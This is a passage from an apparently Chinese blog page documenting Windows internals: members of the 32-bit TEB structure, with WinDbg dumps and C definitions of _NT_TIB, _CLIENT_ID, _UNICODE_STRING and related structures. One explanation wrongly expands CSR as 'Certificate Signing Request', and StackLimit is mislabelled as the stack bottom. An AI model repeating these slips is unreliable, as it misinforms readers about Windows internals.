DeallocationStack;                                 <span class="comment">//0xe0c</span></span><br><span class="line">   VOID* TlsSlots[<span class="number">64</span>];                                      <span class="comment">//0xe10</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">TlsLinks</span>;</span>                             <span class="comment">//0xf10</span></span><br><span class="line">   VOID* Vdm;                                               <span class="comment">//0xf18</span></span><br><span class="line">   VOID* ReservedForNtRpc;                                  <span class="comment">//0xf1c</span></span><br><span class="line">   VOID* DbgSsReserved[<span class="number">2</span>];                                  <span class="comment">//0xf20</span></span><br><span class="line">   ULONG HardErrorsAreDisabled;                             <span class="comment">//0xf28</span></span><br><span class="line">   VOID* Instrumentation[<span class="number">16</span>];                               <span class="comment">//0xf2c</span></span><br><span class="line">   VOID* WinSockData;                                       <span class="comment">//0xf6c</span></span><br><span class="line">   ULONG GdiBatchCount;                                     <span class="comment">//0xf70</span></span><br><span class="line">   UCHAR InDbgPrint;                                        <span class="comment">//0xf74</span></span><br><span class="line">   UCHAR FreeStackOnTermination;                            <span class="comment">//0xf75</span></span><br><span class="line">   UCHAR HasFiberData;                                      <span class="comment">//0xf76</span></span><br><span class="line">   UCHAR IdealProcessor;                                    <span class="comment">//0xf77</span></span><br><span class="line">   ULONG Spare3;                                            <span class="comment">//0xf78</span></span><br><span class="line">   VOID* ReservedForPerf;                                   <span class="comment">//0xf7c</span></span><br><span class="line">   VOID* ReservedForOle;                                    <span class="comment">//0xf80</span></span><br><span class="line">   ULONG WaitingOnLoaderLock;                               <span class="comment">//0xf84</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">Wx86ThreadState</span> <span class="title">Wx86Thread</span>;</span>                      <span class="comment">//0xf88</span></span><br><span class="line">   VOID** TlsExpansionSlots;                                <span class="comment">//0xf94</span></span><br><span class="line">   ULONG ImpersonationLocale;                               <span class="comment">//0xf98</span></span><br><span class="line">   ULONG IsImpersonating;                                   <span class="comment">//0xf9c</span></span><br><span class="line">   VOID* NlsCache;                                          <span class="comment">//0xfa0</span></span><br><span class="line">   VOID* pShimData;                                         <span class="comment">//0xfa4</span></span><br><span class="line">   ULONG HeapVirtualAffinity;                               <span class="comment">//0xfa8</span></span><br><span class="line">   VOID* CurrentTransactionHandle;                          <span class="comment">//0xfac</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME</span>* <span class="title">ActiveFrame</span>;</span>                   <span class="comment">//0xfb0</span></span><br><span class="line">   UCHAR SafeThunkCall;                                     <span class="comment">//0xfb4</span></span><br><span class="line">   UCHAR BooleanSpare[<span class="number">3</span>];                                   <span class="comment">//0xfb5</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong><code>0x000 NtTib</code></strong>：“_NT_TIB”结构体指针，TIB(Thread Information Block: 线程信息块)。</li><li><strong><code>0x01c EnvironmentPointer</code></strong>：EnvironmentPointer对于OS2.EXE是与意义的，即用户模式“OS2 Subsystem Client”，随Windows3.10~5.0一起发布。OS2.EXE包含在Windows 2000中，使NT系统可以运行OS/2应用程序。在以后的任何Windows版本中都不知道该成员的用途。</li><li><strong><code>0x020 ClientId</code></strong>：“_CLIENT_ID”结构。ClientId是提供存储每个线程最简单的特有信息的结构。Windows中的每个线程都有一个标识符。线程应该很容易的获得其自己的标识符以及它属于的进程的标识符。文档化的函数GetCurrentProcessId和GetCurrentThreadId除了从ClientId获得相应的标识符外，什么也不做。</li><li><strong><code>0x028 ActiveRpcHandle</code></strong>：Windows版本3.10在偏移量0x28处保存的是CSR_QLPC_TEB结构的地址。在版本3.51中，该结构被改为位于TEB本身的偏移量0x01AC处。当某个客户端进程中的线程连接到CSRSS服务器时，客户端线程和服务器线程均获得此结构。每个结构都有一个共享节的句柄和一个事件对，一个指向该节视图的指针，以及该视图的线程地址之间的差异。每个结构的句柄和指针都是相对于相应进程的句柄和地址空间的。该节和视图被用于在客户端和服务器之间传递请求和应答。delta允许消息包含指针。事件对提供同步。这在当时是非常重要的，不仅因为事件对是它自己的内核对象，而且等待和信号已经为到达内核提供了专用的中断号。对于服务器线程，该结构以指向客户端线程的CSRSRV表示的指针开始。当它变为偏移量为0x3C的CsrClientThread时，这个指针是4.0版本中存在的东西。<br>&emsp;&emsp;在任何版本中都不知道偏移量0x28处的指针的其他用途。也许它从一开始就被命名为ActiveRpcHandle，远程过程调用(RPC)这个名称从来没有泛指过，而总是特定于嵌入任意客户端进程NTDLL中的CSRDLL和CSRSS服务器进程中的CSRSRV之间的调用。</li><li><strong><code>0x02c ThreadLocalStoragePointer</code></strong>：通过ThreadLocalStoragePointer提供的线程本地存储(TLS)与TlsAlloc等API函数无关。通过TlsSlots数组和TlsExpansionSlots指针进一步深入到TEB中，并通过诸如TlsBitmap这样的PEB成员，可以支持这些功能。相反，ThreadLocalStoragePointer处理可能显示在模块的“PE Header”的“Thread Local Storage Directory”中的线程本地存储。这样的存储通常存在，因为程序有用Microsoft特有的__declspec(thread)存储类修饰符定义的数据。微软的编译器将所有这些数据保存在一个名为.tls的节中。C运行时(CRT)头定义了一个IMAGE_TLS_DIRECTORY来描述此数据及其特殊要求。链接器(Linker)可通过PE头将此描述提供给加载器(Loader)。一旦设置，ThreadLocalStoragePointer指向的是一个指向每个包含模块的线程本地数据的指针数组。至少理论上是这样。在早期，特别是在6.0版本之前，这种做法已经大大减少了，因为这种形式的线程本地存储仅支持与进程一起加载的模块，而不支持稍后加载的dll。关于这个问题可以单独写一篇文章，尤其是因为Microsoft总是以它特有的的风格进行解释，Microsoft倾向于只是间接地解释它，例如“在Windows Vista之前的版本中，您将无法使用LoadLibrary显式加载DLL”或该功能“可能会干扰DLL导入的延迟加载”。</li><li><strong><code>0x030 ProcessEnvironmentBlock</code></strong>：“_PEB”结构指针。</li><li><strong><code>0x034 LastErrorValue</code></strong>：LastErrorValue通常是线程最近对系统调用进行调用的隐藏结果。NTDLL在内核中调用的本地API函数大多返回NTSTATUS作为错误代码。这也适用于NTDLL导出的大多数用于低层Win32 Dlls(如KERNEL32)的函数。许多Win32 API函数(例如在KERNEL32中实现的)都会返回BOOL值以指示成功或失败。其原理似乎是，在Win32 API函数失败后(在某些情况下，即使函数成功了)，调用线程可以通过调用GetLastError获取Win32错误代码。文档化的函数仅仅从LastErrorValue中获取错误代码。当然，所获取的错误代码与任何最近调用的API函数的相关性取决于在所有失败情况下都已将错误代码设置到位的API函数，并且在设置和获取之间，调用者不能做任何可能调用其他API函数的事情。奇怪的是，许多程序员，甚至是那些认为自己是优秀的或有经验的优雅代码作者的程序员，都愿意冒险让LastErrorValue保持不变，即使在他们调用其他代码时，例如C运行时库中的函数。</li><li><strong><code>0x038 CountOfOwnedCriticalSections</code></strong>：对于一些目前未知的目的，SetLastError的3.10版本实现还清除了偏移量0x38处的字节。尽管更高版本的符号文件将此空间命名为CountOfOwnedCriticalSections，目前还不知道它在这方面或其他方面的用途。按照字面意思，应该是当前线程拥有的CriticalSections数量。</li><li><strong><code>0x03c CsrClientThread</code></strong>：CSR(Certificate Signing Request)。在3.50~3.51版本的Windows中，此字段被命名为Win32ProcessInfo。参考“ActiveRpcHandle”。</li><li><strong><code>0x040 Win32ThreadInfo</code></strong>：Win32ProcessInfo和Win32ThreadInfo指向的分别是“PROCESSINFO”和“THREADINFO”结构。在版本4.0和更高版本中，WIN32K.SYS在内核模式下创建这些结构。是的，尽管微软近年来关注阻止内核模式地址泄漏到用户模式空间中，但Win32ThreadInfo指针保留了一个公开的内核模式地址，甚至Windows 10的原始发行版中也是如此。微软的PROCESSINFO和THREADINFO的名称以及它们的成员在Windows 7中WIN32K的符号文件中作为类型信息公开提供(但显然既不是以前也不是以后)。</li><li><strong><code>0x044 User32Reserved</code></strong>：在4.0版本的Windows中，此字段为Win32ClientInfo。0x7C字节Win32ClientInfo的前0x60字节在WIN32K.SYS和USER32.DLL之间共享，当然是作为CLIENTINFO结构共享的。这里假设User32Reserved在所有后来的符号文件中都保留了CLIENTINFO在5.0版本开发期间增长到的大小，在它的进一步增长(到0x84字节)需要重新定位之前，需要判断CurrentLocale(紧随其后)是否被干扰。但谁知道呢?</li><li><strong><code>0x0ac UserReserved</code></strong>：</li><li><strong><code>0x0c0 WOW32Reserved</code></strong>：用户模式32bit(WOW64)-&gt;内核模式转换之前的64位上下文切换函数的指针。</li><li><strong><code>0x0c4 CurrentLocale</code></strong>：CurrentLocale就是文档化的GetThreadLocale和SetThreadLocale函数获取和设置的内容。看到对于最早版本中的先前成员的所有修订，似乎有人确定CurrentLocale在整个历史记录中保持相同的偏移量。为此，它的与众不同之处可能是内核知道它，这将使其在线程初始执行的内核模式部分被设置。</li><li><strong><code>0x0c8 FpSoftwareStatusRegister</code></strong>：尽管FpSoftwareStatusRegister被显示为永久存在，但尚未在任何版本中使用它。值得注意的是，它并没有被Windows Vista之前(包括Windows Vista)的内核和NTDLL保留的用于浮点仿真的代码所使用(但它确实使用了后面的大部分保留区域)。</li><li><strong><code>0x0cc SystemReserved1</code></strong>：在6.1版之前，在任何情况下都不会保留前面的空间以备将来使用：内核和NTDLL都在实际使用它的前0xA0字节来支持浮点仿真。从符号文件中无法得知此结构。即使在该区域正在使用时，也被称为SystemReserved1的原始标签。</li><li><strong><code>0x1a4 ExceptionCode</code></strong>：根据早期DDK中.LIB文件的类型信息，无论如何，保留的空间后面是两个备用空间。当4.0版本引入KiRaiseUserExceptionDispatcher函数时，其中的第二个用作ExceptionCode。NTDLL导出此函数，不是由其他用户模式模块导入，而是由内核找到。内核模式KeRaiseUserException，也随4.0版本一起引入，将异常代码放入TEB中，然后重新定位内核从Ring0退出的目标，以便正在进行的任何系统服务都不会按预期返回，而是由KiRaiseUserExceptionDispatcher获得。然后，这个Stub让NTDLL继续处理，就像在用户模式下调用NTDLL函数RtlRaiseException引发异常一样。该机制的最初目的是帮助调试用户模式的句柄关闭。几乎没有任何程序(包括我的程序)检查它们对诸如CloseHandle之类的函数的调用的成功或失败 - 是的，即使失败可能意味着丢失尚未写入文件的数据。如果在NtGlobalFlag中设置了0x00400000位，或者如果当前进程正在被调试，那么NtClose的用户模式调用者会显示一个无效的句柄或一个被保护不被关闭的句柄，就可以从处理异常中了解到它。目前还不知道5.0版从转移ExceptionCode中得到了什么，除了可能要放弃Spare1的用途之外。</li><li><strong><code>0x1a8 ActivationContextStack</code></strong>：_ACTIVATION_CONTEXT_STACK结构。随着窗口功能从用户模式CSRSS到版本4.0的内核模式WIN32K的重定位，前述的的成员被停止使用或向前转移。他们所占用的空间成为显着的备用空间(如SpareBytes1)。当为Windows XP引入激活上下文时，这些备用字节的开始部分已被用于ACTIVATION_CONTEXT_STACK结构。但是，这种情况很快就改变了。在x86和x64版本的Windows中，TEB仅具有一个指向ACTIVATION_CONTEXT_STACK的指针。起初，几乎ActivationContextStack的所有字节都恢复为备用状态。除了Windows Vista在末尾定义了一个成员外，这些备用字节一直保持备用状态，直到Windows 10将一些用于检测回调，可以通过NtSetInformationProcess的ProcessInstrumentationCallback案例设置。</li><li><strong><code>0x1bc SpareBytes1</code></strong>：备用字节。</li><li><strong><code>0x1d4 GdiTebBatch</code></strong>：_GDI_TEB_BATCH结构。</li><li><strong><code>0x6b4 RealClientId</code></strong>：_CLIENT_ID结构。实际的客户端ID。</li><li><strong><code>0x6bc GdiCachedProcessHandle</code></strong>：GDI缓存进程句柄。</li><li><strong><code>0x6c0 GdiClientPID</code></strong>：GDI客户端PID。</li><li><strong><code>0x6c4 GdiClientTID</code></strong>：GDI客户端TID。</li><li><strong><code>0x6c8 GdiThreadLocalInfo</code></strong>：GdiThreadLocalInfo在版本3.10中指向的是一个0x2C字节的结构，其第一个成员指向服务器中的本地线程信息。在版本3.51中，GdiThreadLocalInfo直接指向此相同的本地线程信息。该信息也指向版本3.10中0x28偏移量(CSR_QLPC_TEB)指向的0x14字节结构中的0x0C偏移量，版本3.51嵌入到0x01AC偏移量(CSR_QLPC_TEB)。</li><li><strong><code>0x6cc Win32ClientInfo</code></strong>：参见User32Reserved。<blockquote><p>随后的几个成员(其名称均以gl开头,Graphics Library)对OPENGL32.DLL和GLSRV.DLL有意义。我知道的最旧的版本都来自Windows NT 3.51，但是我怀疑glDispatchTable支持的许多函数在某个地方存在较早，或者即使没有实现也已计划好了。</p></blockquote></li><li><strong><code>0x7c4 glDispatchTable</code></strong>：版本3.51中的glDispatchTable被指向函数的指针填满，没有为后面称为glReserved1的留下空间。后面标记为glReserved2的指针在3.51版本中似乎未使用，但可能不需要编号后缀。由于后来的版本引入了更多的函数，glDispatchTable显然不能扩展。以后的版本不会填充缩减后的glDispatchTable。</li><li><strong><code>0xb68 glReserved1</code></strong>：</li><li><strong><code>0xbdc glReserved2</code></strong>：</li><li><strong><code>0xbe0 glSectionInfo</code></strong>：</li><li><strong><code>0xbe4 glSection</code></strong>：</li><li><strong><code>0xbe8 glTable</code></strong>：</li><li><strong><code>0xbec glCurrentRC</code></strong>：</li><li><strong><code>0xbf0 glContext</code></strong>：</li><li><strong><code>0xbf4 LastStatusValue</code></strong>：LastStatusValue是最后提供给古老的RtlNtStatusToDosError函数的值。现在这个函数被记录为一个内核导出。这也是一个未文档化的NTDLL导出。该函数与RtlNtStatusDosErrorNoTeb(这也是一个同样古老的内核导出，并且始终存在于NTDLL中，但仅在5.1版本和更高版本中导出)之间的区别在于，后者不会影响TEB中的LastStatusValue。这两个函数都将NTSTATUS转换为Win32错误代码，但仅作为查找：LastErrorValue被单独保留。强烈建议不要通过普通的RtlNtStatusToDosError查找NTSTATUS，而无意继续从该NTSTATUS或另一个NTSTATUS设置Win32错误代码。在5.1版本和更高版本中，NTDLL导出了另一个未文档化的函数，它被命名为RtlSetLastWin32ErrorAndNtStatusFromNtStatus。不知道为什么保存NTSTATUS为LastStatusValue会使其从有符号变为无符号。</li><li><strong><code>0xbf8 StaticUnicodeString</code></strong>：_UNICODE_STRING结构。StaticUnicodeString及其缓冲区似乎为几乎所有临时需要路径名大小缓冲区的API函数提供了便利。</li><li><strong><code>0xc00 StaticUnicodeBuffer</code></strong>：</li><li><strong><code>0xe0c DeallocationStack</code></strong>：</li><li><strong><code>0xe10 TlsSlots</code></strong>：</li><li><strong><code>0xf10 TlsLinks</code></strong>：_LIST_ENTRY结构双链表。TlsLinks成员大概在所有版本的TEB中都有定义，但我不知道它在任何版本中的用法。</li><li><strong><code>0xf18 Vdm</code></strong>：</li><li><strong><code>0xf1c ReservedForNtRpc</code></strong>：RPCRT4.DLL从一开始就使用ReservedForNtRpc成员来保存每个线程的数据(从版本4.0到10.0的符号文件显示为一个名为THREAD的类)。</li><li><strong><code>0xf20 DbgSsReserved</code></strong>：DbgSsReserved是两个句柄的数组，这可能是原始实现的残余，在原始实现中，一个成为调试器的线程连接到由SMSS进程创建的指定端口。在版本5.1及更高版本中，此连接改为一个内核模式的调试对象。调试对象的句柄被保留为数组的第二个元素，但第一个元素被认为是未使用的。 </li><li><strong><code>0xf28 HardErrorsAreDisabled</code></strong>：</li><li><strong><code>0xf2c Instrumentation</code></strong>：</li><li><strong><code>0xf6c WinSockData</code></strong>：</li><li><strong><code>0xf70 GdiBatchCount</code></strong>：</li><li><strong><code>0xf74 InDbgPrint</code></strong>：在版本4.0中，尚不知道接下来的四个字节的用途。版本5.0将第一个用作布尔值，5.1版本定义了两个以上的布尔值和一个8位处理器编号，版本6.0使这三个布尔值显式备用，然后版本6.1将处理器编号扩展为所有四个字节。然而，布尔值并没有全部消失。InDbgPrint成员保护NTDLL函数vDbgPrintExWithPrefix(以及一系列的函数，如DbgPrint和DbgPrintEx)防止同一线程的非平凡重新进入。版本6.0在偏移量0x0FCA和0x17EE的SameTebFlags中将此布尔值修改为DbgInDebugPrint位字段。</li><li><strong><code>0xf75 FreeStackOnTermination</code></strong>：版本6.0中FreeStackOnTermination成员不会继续存在。无论如何，这是线程终止期间古老的防御遗物。在版本5.1之前，如果ExitThread函数仅从当前线程退出，它将切换到TEB本身的用户模式堆栈，释放栈所使用的虚拟内存，然后进入NtTerminateThread。目前还不清楚这能起到多大的作用。内核似乎不太需要大量的用户模式堆栈，但是版本5.0在TEB中将堆栈指针设置得非常低，特别是偏移0xAC。版本5.1不去管堆栈，而是设置FreeStackOnTermination，然后内核释放包含用户模式堆栈的任何虚拟内存。</li><li><strong><code>0xf76 HasFiberData</code></strong>：非零的HasFiberData记录该线程已转换为fiber，并且NtTib的Version成员改为FiberData。它在版本6.0中继续作为SameTebFlags中的DbgHasFiberData位字段。Fiber(纤程)是一种最轻量化的线程。</li><li><strong><code>0xf77 IdealProcessor</code></strong>：在为该线程的第一个用户模式执行做好准备，然后当它的理想处理器(ideal processor)通过NtSetInformationThread案例的ThreadIdealProcessor(0x0D)或ThreadIdealProcessorEx(0x21)更改时，内核首先在TEB中设置IdealProcessor。注意，内核导出KeSetIdealProcessorThread本身并没有在TEB中设置IdealProcessor。<br>&emsp;&emsp;4字节联合会准确地建模，在版本6.1及更高版本中内核为ideal processor设置的内容有些混乱。内核确实设置了一个PROCESSOR_NUMBER，其中16位组和8位数字作为前三个字节，但是0可能会被保留为第四个字节，内核会复制这个数字。这样做的好处是，从版本5.1或更高版本开始，一个8位的IdealProcessor就可以保持相同的偏移量。直到10.0版本，NTDLL仍然有使用它的代码!</li><li><strong><code>0xf78 Spare3</code></strong>：备用字节。</li><li><strong><code>0xf7c ReservedForPerf</code></strong>：</li><li><strong><code>0xf80 ReservedForOle</code></strong>：Windows 2000 only。winternl.h</li><li><strong><code>0xf84 WaitingOnLoaderLock</code></strong>：被称为NTDLL加载器锁的特殊临界区对一些程序员造成了无穷无尽的焦虑，但对另一些程序员来说可能还不够。顾名思义，WaitingOnLoaderLock通常为零，但是，NTDLL不只是“spin”争用的临界区，实际上会等待，结果是临界区为加载器锁时，WaitingOnLoaderLock会递增。</li><li><strong><code>0xf88 Wx86Thread</code></strong>：目前还不知道Wx86Thread的用途。无论它的用途是什么，无论何时它被首次定义，当Windows为32位和64位构建时，它无论如何都会被丢弃。</li><li><strong><code>0xf94 TlsExpansionSlots</code></strong>：</li><li><strong><code>0xf98 ImpersonationLocale</code></strong>：</li><li><strong><code>0xf9c IsImpersonating</code></strong>：</li><li><strong><code>0xfa0 NlsCache</code></strong>：</li><li><strong><code>0xfa4 pShimData</code></strong>：</li><li><strong><code>0xfa8 HeapVirtualAffinity</code></strong>：与LFH(低碎片堆)相关。</li><li><strong><code>0xfac CurrentTransactionHandle</code></strong>：</li><li><strong><code>0xfb0 ActiveFrame</code></strong>：</li><li><strong><code>0xfb4 SafeThunkCall</code></strong>：</li><li><strong><code>0xfb5 BooleanSpare</code></strong>：</li></ul><h4 id="NT-TIB"><a href="#NT-TIB" class="headerlink" title="_NT_TIB"></a>_NT_TIB</h4><p>&emsp;&emsp;TIB(Thread Information Block: 线程信息块)是保存线程基本信息的数据结构。在用户模式下，其位于TEB(Thread Environment Block: 线程环境块)的头部，而TEB是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的TEB。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _NT_TIB</span><br><span class="line">ntdll!_NT_TIB</span><br><span class="line">   +<span class="number">0x000</span> ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> StackBase        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> StackLimit       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> SubSystemTib     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> FiberData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> Version          : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> Self             : Ptr32 _NT_TIB</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x1c bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>* <span class="title">ExceptionList</span>;</span>   <span class="comment">//0x0</span></span><br><span class="line">    VOID* StackBase;                                        <span class="comment">//0x4</span></span><br><span class="line">    VOID* StackLimit;                                       <span class="comment">//0x8</span></span><br><span class="line">    VOID* SubSystemTib;                                     <span class="comment">//0xc</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        VOID* FiberData;                                    <span class="comment">//0x10</span></span><br><span class="line">        ULONG Version;                                      <span class="comment">//0x10</span></span><br><span class="line">    &#125;;</span><br><span class="line">    VOID* ArbitraryUserPointer;                             <span class="comment">//0x14</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span>* <span class="title">Self</span>;</span>                                   <span class="comment">//0x18</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong><code>0x000 ExceptionList</code></strong>：ExceptionList成员指向_EXCEPTION_REGISTRATION_RECORD结构体组成的链表，它用于Windows的SEH。SEH链表的链表头就放在此成员中，当程序发生异常时，会从此结构中得到SEH链表的表头，然后通过遍历SEH链表找到一个合适的异常处理程序进行异常处理。</li><li><strong><code>0x004 StackBase</code></strong>：当前线程所使用的栈的栈底(高地址)。</li><li><strong><code>0x008 StackLimit</code></strong>：当前线程所使用的栈的栈底(低地址)。</li><li><strong><code>0x00c SubSystemTib</code></strong>：</li><li><strong><code>0x010 FiberData</code></strong>：纤程数据。</li><li><strong><code>0x010 Version</code></strong>：</li><li><strong><code>0x014 ArbitraryUserPointer</code></strong>：</li><li><strong><code>0x018 Self</code></strong>：指向TIB结构自身。通过fs:[0x18]可以得到TEB结构的地址，NtCurrentTeb()函数中就是通过这种方法获取TEB结构的地址的。</li></ul><h4 id="CLIENT-ID"><a href="#CLIENT-ID" class="headerlink" title="_CLIENT_ID"></a>_CLIENT_ID</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _CLIENT_ID</span><br><span class="line">ntdll!_CLIENT_ID</span><br><span class="line">   +<span class="number">0x000</span> UniqueProcess    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x004</span> UniqueThread     : Ptr32 Void</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    VOID* UniqueProcess;            <span class="comment">//0x0</span></span><br><span class="line">    VOID* UniqueThread;             <span class="comment">//0x4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong><code>0x000 UniqueProcess</code></strong>：PID(Process Identifier)，GetCurrentProcessId()获取的值。</li><li><strong><code>0x004 UniqueThread</code></strong>：TID(Thread Identifier)，GetCurrentThreadId()获取的值。</li></ul><h4 id="PEB"><a href="#PEB" class="headerlink" title="_PEB"></a>_PEB</h4><p>&emsp;&emsp;见下方。</p><h4 id="ACTIVATION-CONTEXT-STACK"><a href="#ACTIVATION-CONTEXT-STACK" class="headerlink" title="_ACTIVATION_CONTEXT_STACK"></a>_ACTIVATION_CONTEXT_STACK</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _ACTIVATION_CONTEXT_STACK</span><br><span class="line">ntdll!_ACTIVATION_CONTEXT_STACK</span><br><span class="line">   +<span class="number">0x000</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> NextCookieSequenceNumber : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> ActiveFrame      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> FrameListCache   : _LIST_ENTRY</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x14 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT_STACK</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Flags;                               <span class="comment">//0x0</span></span><br><span class="line">    ULONG NextCookieSequenceNumber;            <span class="comment">//0x4</span></span><br><span class="line">    VOID* ActiveFrame;                         <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FrameListCache</span>;</span>         <span class="comment">//0xc</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="GDI-TEB-BATCH"><a href="#GDI-TEB-BATCH" class="headerlink" title="_GDI_TEB_BATCH"></a>_GDI_TEB_BATCH</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _GDI_TEB_BATCH</span><br><span class="line">ntdll!_GDI_TEB_BATCH</span><br><span class="line">   +<span class="number">0x000</span> Offset           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> HDC              : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> Buffer           : [<span class="number">310</span>] Uint4B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x4e0 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GDI_TEB_BATCH</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Offset;                              <span class="comment">//0x0</span></span><br><span class="line">    ULONG HDC;                                 <span class="comment">//0x4</span></span><br><span class="line">    ULONG Buffer[<span class="number">310</span>];                         <span class="comment">//0x8</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="UNICODE-STRING"><a href="#UNICODE-STRING" class="headerlink" title="_UNICODE_STRING"></a>_UNICODE_STRING</h4><p>&emsp;&emsp;存储Unicode字符串的结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _UNICODE_STRING</span><br><span class="line">ntdll!_UNICODE_STRING</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> MaximumLength    : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> Buffer           : Ptr32 Uint2B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;                             <span class="comment">//0x0</span></span><br><span class="line">    USHORT MaximumLength;                      <span class="comment">//0x2</span></span><br><span class="line">    USHORT* Buffer;                            <span class="comment">//0x4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong><code>0x000 Length</code></strong>：存储的Unicode字符串的长度。</li><li><strong><code>0x002 MaximumLength</code></strong>：能够存储的Unicode字符串的最大长度。</li><li><strong><code>0x004 Buffer</code></strong>：存储Unicode字符串的缓冲区。</li></ul><h4 id="LIST-ENTRY"><a href="#LIST-ENTRY" class="headerlink" title="_LIST_ENTRY"></a>_LIST_ENTRY</h4><p>&emsp;&emsp;双链表结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _LIST_ENTRY</span><br><span class="line">ntdll!_LIST_ENTRY</span><br><span 